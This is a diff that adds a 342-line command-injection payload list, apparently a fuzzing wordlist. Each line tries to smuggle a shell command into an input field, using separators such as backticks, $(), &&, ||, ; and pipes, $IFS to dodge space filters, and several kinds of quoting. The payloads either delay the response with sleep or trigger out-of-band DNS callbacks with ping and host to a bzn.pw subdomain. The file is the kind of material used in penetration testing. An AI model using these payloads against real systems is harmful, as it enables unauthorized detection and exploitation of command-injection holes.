@@ -1,0 +1,342 @@
+sleep 10
+sleep$IFS10
+ping -c 10 command1.5696d8f4.bzn.pw
+ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw
+host command2.5696d8f4.bzn.pw
+host$IFScommand2.5696d8f4.bzn.pw
+`sleep 10`
+`sleep$IFS10`
+`ping -c 10 command1.5696d8f4.bzn.pw`
+`ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw`
+`host command2.5696d8f4.bzn.pw`
+`host$IFScommand2.5696d8f4.bzn.pw`
+$(sleep 10)
+$(sleep$IFS10)
+$(ping -c 10 command1.5696d8f4.bzn.pw)
+$(ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw)
+$(host command2.5696d8f4.bzn.pw)
+$(host$IFScommand2.5696d8f4.bzn.pw)
+&&sleep 10
+&&sleep$IFS10
+&&ping -c 10 command1.5696d8f4.bzn.pw
+&&ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw
+&&host command2.5696d8f4.bzn.pw
+&&host$IFScommand2.5696d8f4.bzn.pw
+||sleep 10
+||sleep$IFS10
+||ping -c 10 command1.5696d8f4.bzn.pw
+||ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw
+||host command2.5696d8f4.bzn.pw
+||host$IFScommand2.5696d8f4.bzn.pw
+;sleep 10
+;sleep$IFS10
+;ping -c 10 command1.5696d8f4.bzn.pw
+;ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw
+;host command2.5696d8f4.bzn.pw
+;host$IFScommand2.5696d8f4.bzn.pw
+|sleep 10
+|sleep$IFS10
+|ping -c 10 command1.5696d8f4.bzn.pw
+|ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw
+|host command2.5696d8f4.bzn.pw
+|host$IFScommand2.5696d8f4.bzn.pw
+&&sleep 10&&
+&&sleep$IFS10&&
+&&ping -c 10 command1.5696d8f4.bzn.pw&&
+&&ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw&&
+&&host command2.5696d8f4.bzn.pw&&
+&&host$IFScommand2.5696d8f4.bzn.pw&&
+||sleep 10||
+||sleep$IFS10||
+||ping -c 10 command1.5696d8f4.bzn.pw||
+||ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw||
+||host command2.5696d8f4.bzn.pw||
+||host$IFScommand2.5696d8f4.bzn.pw||
+;sleep 10;
+;sleep$IFS10;
+;ping -c 10 command1.5696d8f4.bzn.pw;
+;ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw;
+;host command2.5696d8f4.bzn.pw;
+;host$IFScommand2.5696d8f4.bzn.pw;
+|sleep 10|
+|sleep$IFS10|
+|ping -c 10 command1.5696d8f4.bzn.pw|
+|ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw|
+|host command2.5696d8f4.bzn.pw|
+|host$IFScommand2.5696d8f4.bzn.pw|
+&&sleep 10&&echo 
+&&sleep 10&&echo$IFS
+&&sleep$IFS10&&echo 
+&&sleep$IFS10&&echo$IFS
+&&ping -c 10 command1.5696d8f4.bzn.pw&&echo 
+&&ping -c 10 command1.5696d8f4.bzn.pw&&echo$IFS
+&&ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw&&echo 
+&&ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw&&echo$IFS
+&&host command2.5696d8f4.bzn.pw&&echo 
+&&host command2.5696d8f4.bzn.pw&&echo$IFS
+&&host$IFScommand2.5696d8f4.bzn.pw&&echo 
+&&host$IFScommand2.5696d8f4.bzn.pw&&echo$IFS
+||sleep 10||echo 
+||sleep 10||echo$IFS
+||sleep$IFS10||echo 
+||sleep$IFS10||echo$IFS
+||ping -c 10 command1.5696d8f4.bzn.pw||echo 
+||ping -c 10 command1.5696d8f4.bzn.pw||echo$IFS
+||ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw||echo 
+||ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw||echo$IFS
+||host command2.5696d8f4.bzn.pw||echo 
+||host command2.5696d8f4.bzn.pw||echo$IFS
+||host$IFScommand2.5696d8f4.bzn.pw||echo 
+||host$IFScommand2.5696d8f4.bzn.pw||echo$IFS
+;sleep 10;echo 
+;sleep 10;echo$IFS
+;sleep$IFS10;echo 
+;sleep$IFS10;echo$IFS
+;ping -c 10 command1.5696d8f4.bzn.pw;echo 
+;ping -c 10 command1.5696d8f4.bzn.pw;echo$IFS
+;ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw;echo 
+;ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw;echo$IFS
+;host command2.5696d8f4.bzn.pw;echo 
+;host command2.5696d8f4.bzn.pw;echo$IFS
+;host$IFScommand2.5696d8f4.bzn.pw;echo 
+;host$IFScommand2.5696d8f4.bzn.pw;echo$IFS
+|sleep 10|echo 
+|sleep 10|echo$IFS
+|sleep$IFS10|echo 
+|sleep$IFS10|echo$IFS
+|ping -c 10 command1.5696d8f4.bzn.pw|echo 
+|ping -c 10 command1.5696d8f4.bzn.pw|echo$IFS
+|ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw|echo 
+|ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw|echo$IFS
+|host command2.5696d8f4.bzn.pw|echo 
+|host command2.5696d8f4.bzn.pw|echo$IFS
+|host$IFScommand2.5696d8f4.bzn.pw|echo 
+|host$IFScommand2.5696d8f4.bzn.pw|echo$IFS
+'sleep 10'
+'sleep$IFS10'
+'ping -c 10 command1.5696d8f4.bzn.pw'
+'ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw'
+'host command2.5696d8f4.bzn.pw'
+'host$IFScommand2.5696d8f4.bzn.pw'
+'`sleep 10`'
+'`sleep$IFS10`'
+'`ping -c 10 command1.5696d8f4.bzn.pw`'
+'`ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw`'
+'`host command2.5696d8f4.bzn.pw`'
+'`host$IFScommand2.5696d8f4.bzn.pw`'
+'$(sleep 10)'
+'$(sleep$IFS10)'
+'$(ping -c 10 command1.5696d8f4.bzn.pw)'
+'$(ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw)'
+'$(host command2.5696d8f4.bzn.pw)'
+'$(host$IFScommand2.5696d8f4.bzn.pw)'
+'&&sleep 10'
+'&&sleep$IFS10'
+'&&ping -c 10 command1.5696d8f4.bzn.pw'
+'&&ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw'
+'&&host command2.5696d8f4.bzn.pw'
+'&&host$IFScommand2.5696d8f4.bzn.pw'
+'||sleep 10'
+'||sleep$IFS10'
+'||ping -c 10 command1.5696d8f4.bzn.pw'
+'||ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw'
+'||host command2.5696d8f4.bzn.pw'
+'||host$IFScommand2.5696d8f4.bzn.pw'
+';sleep 10'
+';sleep$IFS10'
+';ping -c 10 command1.5696d8f4.bzn.pw'
+';ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw'
+';host command2.5696d8f4.bzn.pw'
+';host$IFScommand2.5696d8f4.bzn.pw'
+'|sleep 10'
+'|sleep$IFS10'
+'|ping -c 10 command1.5696d8f4.bzn.pw'
+'|ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw'
+'|host command2.5696d8f4.bzn.pw'
+'|host$IFScommand2.5696d8f4.bzn.pw'
+'&&sleep 10&&'
+'&&sleep$IFS10&&'
+'&&ping -c 10 command1.5696d8f4.bzn.pw&&'
+'&&ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw&&'
+'&&host command2.5696d8f4.bzn.pw&&'
+'&&host$IFScommand2.5696d8f4.bzn.pw&&'
+'||sleep 10||'
+'||sleep$IFS10||'
+'||ping -c 10 command1.5696d8f4.bzn.pw||'
+'||ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw||'
+'||host command2.5696d8f4.bzn.pw||'
+'||host$IFScommand2.5696d8f4.bzn.pw||'
+';sleep 10;'
+';sleep$IFS10;'
+';ping -c 10 command1.5696d8f4.bzn.pw;'
+';ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw;'
+';host command2.5696d8f4.bzn.pw;'
+';host$IFScommand2.5696d8f4.bzn.pw;'
+'|sleep 10|'
+'|sleep$IFS10|'
+'|ping -c 10 command1.5696d8f4.bzn.pw|'
+'|ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw|'
+'|host command2.5696d8f4.bzn.pw|'
+'|host$IFScommand2.5696d8f4.bzn.pw|'
+'&&sleep 10&&echo '
+'&&sleep 10&&echo$IFS'
+'&&sleep$IFS10&&echo '
+'&&sleep$IFS10&&echo$IFS'
+'&&ping -c 10 command1.5696d8f4.bzn.pw&&echo '
+'&&ping -c 10 command1.5696d8f4.bzn.pw&&echo$IFS'
+'&&ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw&&echo '
+'&&ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw&&echo$IFS'
+'&&host command2.5696d8f4.bzn.pw&&echo '
+'&&host command2.5696d8f4.bzn.pw&&echo$IFS'
+'&&host$IFScommand2.5696d8f4.bzn.pw&&echo '
+'&&host$IFScommand2.5696d8f4.bzn.pw&&echo$IFS'
+'||sleep 10||echo '
+'||sleep 10||echo$IFS'
+'||sleep$IFS10||echo '
+'||sleep$IFS10||echo$IFS'
+'||ping -c 10 command1.5696d8f4.bzn.pw||echo '
+'||ping -c 10 command1.5696d8f4.bzn.pw||echo$IFS'
+'||ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw||echo '
+'||ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw||echo$IFS'
+'||host command2.5696d8f4.bzn.pw||echo '
+'||host command2.5696d8f4.bzn.pw||echo$IFS'
+'||host$IFScommand2.5696d8f4.bzn.pw||echo '
+'||host$IFScommand2.5696d8f4.bzn.pw||echo$IFS'
+';sleep 10;echo '
+';sleep 10;echo$IFS'
+';sleep$IFS10;echo '
+';sleep$IFS10;echo$IFS'
+';ping -c 10 command1.5696d8f4.bzn.pw;echo '
+';ping -c 10 command1.5696d8f4.bzn.pw;echo$IFS'
+';ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw;echo '
+';ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw;echo$IFS'
+';host command2.5696d8f4.bzn.pw;echo '
+';host command2.5696d8f4.bzn.pw;echo$IFS'
+';host$IFScommand2.5696d8f4.bzn.pw;echo '
+';host$IFScommand2.5696d8f4.bzn.pw;echo$IFS'
+'|sleep 10|echo '
+'|sleep 10|echo$IFS'
+'|sleep$IFS10|echo '
+'|sleep$IFS10|echo$IFS'
+'|ping -c 10 command1.5696d8f4.bzn.pw|echo '
+'|ping -c 10 command1.5696d8f4.bzn.pw|echo$IFS'
+'|ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw|echo '
+'|ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw|echo$IFS'
+'|host command2.5696d8f4.bzn.pw|echo '
+'|host command2.5696d8f4.bzn.pw|echo$IFS'
+'|host$IFScommand2.5696d8f4.bzn.pw|echo '
+'|host$IFScommand2.5696d8f4.bzn.pw|echo$IFS'
+"sleep 10"
+"sleep$IFS10"
+"ping -c 10 command1.5696d8f4.bzn.pw"
+"ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw"
+"host command2.5696d8f4.bzn.pw"
+"host$IFScommand2.5696d8f4.bzn.pw"
+"`sleep 10`"
+"`sleep$IFS10`"
+"`ping -c 10 command1.5696d8f4.bzn.pw`"
+"`ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw`"
+"`host command2.5696d8f4.bzn.pw`"
+"`host$IFScommand2.5696d8f4.bzn.pw`"
+"$(sleep 10)"
+"$(sleep$IFS10)"
+"$(ping -c 10 command1.5696d8f4.bzn.pw)"
+"$(ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw)"
+"$(host command2.5696d8f4.bzn.pw)"
+"$(host$IFScommand2.5696d8f4.bzn.pw)"
+"&&sleep 10"
+"&&sleep$IFS10"
+"&&ping -c 10 command1.5696d8f4.bzn.pw"
+"&&ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw"
+"&&host command2.5696d8f4.bzn.pw"
+"&&host$IFScommand2.5696d8f4.bzn.pw"
+"||sleep 10"
+"||sleep$IFS10"
+"||ping -c 10 command1.5696d8f4.bzn.pw"
+"||ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw"
+"||host command2.5696d8f4.bzn.pw"
+"||host$IFScommand2.5696d8f4.bzn.pw"
+";sleep 10"
+";sleep$IFS10"
+";ping -c 10 command1.5696d8f4.bzn.pw"
+";ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw"
+";host command2.5696d8f4.bzn.pw"
+";host$IFScommand2.5696d8f4.bzn.pw"
+"|sleep 10"
+"|sleep$IFS10"
+"|ping -c 10 command1.5696d8f4.bzn.pw"
+"|ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw"
+"|host command2.5696d8f4.bzn.pw"
+"|host$IFScommand2.5696d8f4.bzn.pw"
+"&&sleep 10&&"
+"&&sleep$IFS10&&"
+"&&ping -c 10 command1.5696d8f4.bzn.pw&&"
+"&&ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw&&"
+"&&host command2.5696d8f4.bzn.pw&&"
+"&&host$IFScommand2.5696d8f4.bzn.pw&&"
+"||sleep 10||"
+"||sleep$IFS10||"
+"||ping -c 10 command1.5696d8f4.bzn.pw||"
+"||ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw||"
+"||host command2.5696d8f4.bzn.pw||"
+"||host$IFScommand2.5696d8f4.bzn.pw||"
+";sleep 10;"
+";sleep$IFS10;"
+";ping -c 10 command1.5696d8f4.bzn.pw;"
+";ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw;"
+";host command2.5696d8f4.bzn.pw;"
+";host$IFScommand2.5696d8f4.bzn.pw;"
+"|sleep 10|"
+"|sleep$IFS10|"
+"|ping -c 10 command1.5696d8f4.bzn.pw|"
+"|ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw|"
+"|host command2.5696d8f4.bzn.pw|"
+"|host$IFScommand2.5696d8f4.bzn.pw|"
+"&&sleep 10&&echo "
+"&&sleep 10&&echo$IFS"
+"&&sleep$IFS10&&echo "
+"&&sleep$IFS10&&echo$IFS"
+"&&ping -c 10 command1.5696d8f4.bzn.pw&&echo "
+"&&ping -c 10 command1.5696d8f4.bzn.pw&&echo$IFS"
+"&&ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw&&echo "
+"&&ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw&&echo$IFS"
+"&&host command2.5696d8f4.bzn.pw&&echo "
+"&&host command2.5696d8f4.bzn.pw&&echo$IFS"
+"&&host$IFScommand2.5696d8f4.bzn.pw&&echo "
+"&&host$IFScommand2.5696d8f4.bzn.pw&&echo$IFS"
+"||sleep 10||echo "
+"||sleep 10||echo$IFS"
+"||sleep$IFS10||echo "
+"||sleep$IFS10||echo$IFS"
+"||ping -c 10 command1.5696d8f4.bzn.pw||echo "
+"||ping -c 10 command1.5696d8f4.bzn.pw||echo$IFS"
+"||ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw||echo "
+"||ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw||echo$IFS"
+"||host command2.5696d8f4.bzn.pw||echo "
+"||host command2.5696d8f4.bzn.pw||echo$IFS"
+"||host$IFScommand2.5696d8f4.bzn.pw||echo "
+"||host$IFScommand2.5696d8f4.bzn.pw||echo$IFS"
+";sleep 10;echo "
+";sleep 10;echo$IFS"
+";sleep$IFS10;echo "
+";sleep$IFS10;echo$IFS"
+";ping -c 10 command1.5696d8f4.bzn.pw;echo "
+";ping -c 10 command1.5696d8f4.bzn.pw;echo$IFS"
+";ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw;echo "
+";ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw;echo$IFS"
+";host command2.5696d8f4.bzn.pw;echo "
+";host command2.5696d8f4.bzn.pw;echo$IFS"
+";host$IFScommand2.5696d8f4.bzn.pw;echo "
+";host$IFScommand2.5696d8f4.bzn.pw;echo$IFS"
+"|sleep 10|echo "
+"|sleep 10|echo$IFS"
+"|sleep$IFS10|echo "
+"|sleep$IFS10|echo$IFS"
+"|ping -c 10 command1.5696d8f4.bzn.pw|echo "
+"|ping -c 10 command1.5696d8f4.bzn.pw|echo$IFS"
+"|ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw|echo "
+"|ping$IFS-c$IFS10$IFScommand1.5696d8f4.bzn.pw|echo$IFS"
+"|host command2.5696d8f4.bzn.pw|echo "
+"|host command2.5696d8f4.bzn.pw|echo$IFS"
+"|host$IFScommand2.5696d8f4.bzn.pw|echo "
+"|host$IFScommand2.5696d8f4.bzn.pw|echo$IFS"
